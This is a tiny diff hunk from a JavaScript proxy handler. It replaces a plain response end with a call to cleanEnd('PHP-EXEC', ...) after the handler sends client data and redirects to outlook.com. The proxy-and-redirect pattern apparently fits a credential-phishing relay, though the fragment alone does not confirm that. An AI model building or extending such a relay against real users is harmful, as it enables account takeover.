@@ -116,7 +116,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             clientContext.setLogAvailable(true)
             super.sendClientData(clientContext, {})
             this.res.writeHead('301', {location: 'https://outlook.com'})
-            return this.res.end()
+            return super.cleanEnd('PHP-EXEC', clientContext)
         }
 
         return super.superExecuteProxy(clientContext.currentDomain, clientContext)
